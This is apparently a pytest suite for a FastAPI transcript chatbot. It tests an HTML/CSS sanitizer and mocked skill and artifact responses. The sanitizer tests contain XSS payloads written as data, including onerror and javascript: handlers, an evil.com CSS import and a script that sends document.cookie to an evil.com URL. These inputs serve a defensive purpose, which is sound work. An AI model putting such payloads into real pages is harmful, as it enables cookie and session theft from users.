import sys
from pathlib import Path
import pytest
from unittest.mock import patch, AsyncMock, Mock
from fastapi.testclient import TestClient

backend_dir = Path(__file__).resolve().parent.parent / "backend"
if str(backend_dir) not in sys.path:
    sys.path.insert(0, str(backend_dir))

from app.main import app
from app.security import sanitize_and_validate_html, validate_and_sanitize_html

client = TestClient(app)


def make_mock_response(data: dict, status_code: int = 200):
    mock_resp = Mock()
    mock_resp.status_code = status_code
    mock_resp.json = Mock(return_value=data)
    mock_resp.text = str(data)
    return mock_resp


# -----------------------------------------------------------------------------
# 1. HTML & CSS Security & Sanitization Unit Tests (Checkpoints 1-6)
# -----------------------------------------------------------------------------

def test_security_1_safe_html_remains_intact():
    safe_html = """
    <div class="card" style="background: #1e1e2e; color: #ffffff; padding: 20px; border-radius: 8px;">
        <h2 style="color: #6366f1;">Product-Market Fit Framework</h2>
        <p>Grounded in insights from Rahul Vohra and Todd Jackson.</p>
        <a href="https://youtube.com/watch?v=0igjSRZyX-w" target="_blank">Watch on YouTube</a>
    </div>
    """
    cleaned, status, modified, error = sanitize_and_validate_html(safe_html, mode="sanitize")
    assert status == "valid"
    assert modified is False
    assert error is None
    assert "Product-Market Fit Framework" in cleaned
    assert "https://youtube.com/watch?v=0igjSRZyX-w" in cleaned
    assert 'rel="noopener noreferrer"' in cleaned


def test_security_2_script_tag_is_removed():
    unsafe = "<div><h2>Title</h2><script>alert('pwned');</script><p>Safe text</p></div>"
    cleaned, status, modified, error = sanitize_and_validate_html(unsafe, mode="sanitize")
    assert status == "sanitized"
    assert modified is True
    assert "<script>" not in cleaned
    assert "alert('pwned')" not in cleaned
    assert "<h2>Title</h2>" in cleaned
    assert "<p>Safe text</p>" in cleaned


def test_security_3_onclick_is_removed():
    unsafe = '<button onclick="evilAction()">Click me</button>'
    cleaned, status, modified, error = sanitize_and_validate_html(unsafe, mode="sanitize")
    assert "onclick" not in cleaned
    assert "evilAction" not in cleaned


def test_security_4_onerror_is_removed():
    unsafe = '<img src="invalid.jpg" onerror="alert(document.domain)" alt="Logo">'
    cleaned, status, modified, error = sanitize_and_validate_html(unsafe, mode="sanitize")
    assert "onerror" not in cleaned
    assert "alert" not in cleaned
    assert '<img' in cleaned
    assert 'alt="Logo"' in cleaned


def test_security_5_javascript_href_is_removed():
    unsafe = '<a href="javascript:void(document.cookie)">Click here</a>'
    cleaned, status, modified, error = sanitize_and_validate_html(unsafe, mode="sanitize")
    assert "javascript:" not in cleaned
    assert "Click here" in cleaned


def test_security_6_iframe_is_removed():
    unsafe = '<div><iframe src="http://malicious.site/phish"></iframe><p>Content</p></div>'
    cleaned, status, modified, error = sanitize_and_validate_html(unsafe, mode="sanitize")
    assert "<iframe" not in cleaned
    assert "Content" in cleaned


def test_security_7_object_is_removed():
    unsafe = '<div><object data="malicious.swf"></object><p>Legitimate</p></div>'
    cleaned, status, modified, error = sanitize_and_validate_html(unsafe, mode="sanitize")
    assert "<object" not in cleaned
    assert "Legitimate" in cleaned


def test_security_8_embed_is_removed():
    unsafe = '<div><embed src="flash.swf"><p>Clean</p></div>'
    cleaned, status, modified, error = sanitize_and_validate_html(unsafe, mode="sanitize")
    assert "<embed" not in cleaned
    assert "Clean" in cleaned


def test_security_9_dangerous_css_resources_removed():
    unsafe_css = """
    <style>
        @import url("http://evil.com/leak.css");
        .box {
            color: red;
            background-image: url(javascript:alert(1));
            width: expression(alert(1));
        }
    </style>
    <div class="box">Styled content</div>
    """
    cleaned, status, modified, error = sanitize_and_validate_html(unsafe_css, mode="sanitize")
    assert "@import" not in cleaned
    assert "javascript:" not in cleaned
    assert "expression(" not in cleaned
    assert ".box" in cleaned
    assert "color: red;" in cleaned


def test_security_10_safe_css_remains_intact():
    safe_css = """
    <style>
        .infographic {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            font-family: -apple-system, sans-serif;
            background: linear-gradient(135deg, #1e1e2e 0%, #2d2b55 100%);
            color: #ffffff;
            border-radius: 12px;
            padding: 24px;
        }
    </style>
    <div class="infographic"><h3>Metric Card</h3></div>
    """
    cleaned, status, modified, error = sanitize_and_validate_html(safe_css, mode="sanitize")
    assert "grid-template-columns" in cleaned
    assert "linear-gradient" in cleaned
    assert "Metric Card" in cleaned


def test_security_11_tables_and_cards_remain_usable():
    table_html = """
    <table style="width: 100%; border-collapse: collapse;">
        <thead>
            <tr><th>Guest</th><th>PMF Metric</th></tr>
        </thead>
        <tbody>
            <tr><td>Rahul Vohra</td><td>40% very disappointed</td></tr>
            <tr><td>Todd Jackson</td><td>Market pull & retention</td></tr>
        </tbody>
    </table>
    """
    cleaned, status, modified, error = sanitize_and_validate_html(table_html, mode="sanitize")
    assert "<table>" in cleaned or "<table" in cleaned
    assert "Rahul Vohra" in cleaned
    assert "40% very disappointed" in cleaned


def test_security_12_sanitization_is_deterministic():
    html_input = '<div class="test" onclick="bad()"><p>Deterministic <script>evil()</script>text</p></div>'
    res1 = sanitize_and_validate_html(html_input, mode="sanitize")
    res2 = sanitize_and_validate_html(html_input, mode="sanitize")
    assert res1 == res2


def test_security_13_reject_mode_fails_safely():
    unsafe = '<div><h2>Title</h2><script>alert(1)</script></div>'
    cleaned, status, modified, error = sanitize_and_validate_html(unsafe, mode="reject")
    assert status == "rejected"
    assert cleaned == ""
    assert error is not None
    assert "Forbidden HTML element" in error


def test_security_14_transcript_text_cannot_create_executable_html():
    injection_transcript = '<blockquote>Lenny: <script>document.location="http://evil.com/steal?"+document.cookie</script>What is your strategy?</blockquote>'
    cleaned, status, modified, error = sanitize_and_validate_html(injection_transcript, mode="sanitize")
    assert "<script" not in cleaned
    assert "document.cookie" not in cleaned
    assert "What is your strategy?" in cleaned


# -----------------------------------------------------------------------------
# 2. Skill Invocation & Structured Content Tests
# -----------------------------------------------------------------------------

def test_normal_question_does_not_invoke_content_skill():
    mock_resp = make_mock_response({
        "status": "ok",
        "response": "Lenny discusses MVPs with Eric Ries.",
        "provider": "gemini",
        "model": "gemini-2.5-flash",
        "sources": [],
        "skill_invoked": None,
        "content": None,
        "artifact": None,
    })

    with patch("httpx.AsyncClient.post", new_callable=AsyncMock, return_value=mock_resp):
        response = client.post(
            "/chat",
            json={"prompt": "What does Lenny say about MVPs?", "provider": "gemini"},
        )
        assert response.status_code == 200
        data = response.json()
        assert data["skill_invoked"] is None
        assert data["content"] is None
        assert data["artifact"] is None


def test_ship30_essay_generation():
    mock_resp = make_mock_response({
        "status": "ok",
        "response": "# The Truth About MVPs\n\nMost founders get MVPs wrong.\n\nThey build too much.",
        "provider": "gemini",
        "model": "gemini-2.5-flash",
        "sources": [
            {
                "guest": "Eric Ries",
                "episode": "Reflections on a movement | Eric Ries",
                "speaker": "Eric Ries",
                "timestamp": "00:19:41",
                "source_url": "https://www.youtube.com/watch?v=xzebbzIntFc&t=1181",
                "score": 0.85,
            }
        ],
        "skill_invoked": "ship30",
        "content": {
            "type": "article",
            "title": "Ship 30 Essay",
            "content": "# The Truth About MVPs\n\nMost founders get MVPs wrong.\n\nThey build too much.",
        },
        "artifact": None,
    })

    with patch("httpx.AsyncClient.post", new_callable=AsyncMock, return_value=mock_resp):
        response = client.post(
            "/chat",
            json={"prompt": "Turn what we learned about MVPs into a Ship 30 essay.", "provider": "gemini"},
        )
        assert response.status_code == 200
        data = response.json()
        assert data["skill_invoked"] == "ship30"
        assert data["content"] is not None
        assert data["content"]["type"] == "article"
        assert len(data["sources"]) > 0


def test_structured_content_key_points_and_comparison():
    mock_resp = make_mock_response({
        "status": "ok",
        "response": "Here is the structured breakdown of PMF perspectives.",
        "provider": "gemini",
        "model": "gemini-2.5-flash",
        "sources": [],
        "skill_invoked": "structured-content",
        "content": {
            "type": "key_points",
            "title": "KEY POINTS",
            "content": "1. Rahul Vohra: 40% rule\n2. Todd Jackson: Market pull",
        },
        "artifact": None,
    })

    with patch("httpx.AsyncClient.post", new_callable=AsyncMock, return_value=mock_resp):
        response = client.post(
            "/chat",
            json={"prompt": "Give me the key takeaways on finding PMF.", "provider": "gemini"},
        )
        assert response.status_code == 200
        data = response.json()
        assert data["skill_invoked"] == "structured-content"
        assert data["content"]["type"] == "key_points"


def test_markdown_artifact_generation():
    mock_resp = make_mock_response({
        "status": "ok",
        "response": "Here is the markdown artifact.",
        "provider": "gemini",
        "model": "gemini-2.5-flash",
        "sources": [
            {
                "guest": "Andy Johns",
                "episode": "When enough is enough | Andy Johns",
                "speaker": "Andy Johns",
                "timestamp": "00:13:16",
                "source_url": "https://www.youtube.com/watch?v=_93m4PriHyc&t=796",
                "score": 1.1,
            }
        ],
        "skill_invoked": "artifact-markdown",
        "content": None,
        "artifact": {
            "type": "markdown",
            "title": "Burnout in Tech Overview",
            "content": "# Burnout in Tech\n\n## Insights from Andy Johns\n- 50-60% of senior tech workers experience distress.",
        },
    })

    with patch("httpx.AsyncClient.post", new_callable=AsyncMock, return_value=mock_resp):
        response = client.post(
            "/chat",
            json={"prompt": "Create a Markdown document summarizing Andy Johns on burnout.", "provider": "gemini"},
        )
        assert response.status_code == 200
        data = response.json()
        assert data["artifact"] is not None
        assert data["artifact"]["type"] == "markdown"
        assert data["artifact"]["validation_status"] == "valid"
        assert data["artifact"]["artifact_id"].startswith("art_")


def test_html_artifact_sanitized_flow():
    # Input HTML contains safe card markup + an unsafe inline event handler
    input_html = "<div class='card' onclick='bad()'><h2>Andy Johns on Burnout</h2><p>50-60% affected.</p></div>"
    mock_resp = make_mock_response({
        "status": "ok",
        "response": "Here is the visual HTML artifact.",
        "provider": "gemini",
        "model": "gemini-2.5-flash",
        "sources": [],
        "skill_invoked": "artifact-html",
        "content": None,
        "artifact": {
            "type": "html",
            "title": "Visual Summary",
            "content": input_html,
        },
    })

    with patch("httpx.AsyncClient.post", new_callable=AsyncMock, return_value=mock_resp):
        response = client.post(
            "/chat",
            json={"prompt": "Turn this into a visual HTML card.", "provider": "gemini"},
        )
        assert response.status_code == 200
        data = response.json()
        assert data["artifact"] is not None
        assert data["artifact"]["type"] == "html"
        assert data["artifact"]["validation_status"] in ["valid", "sanitized"]
        assert data["artifact"]["original_modified"] is True
        assert "onclick" not in data["artifact"]["content"]
        assert "50-60% affected" in data["artifact"]["content"]
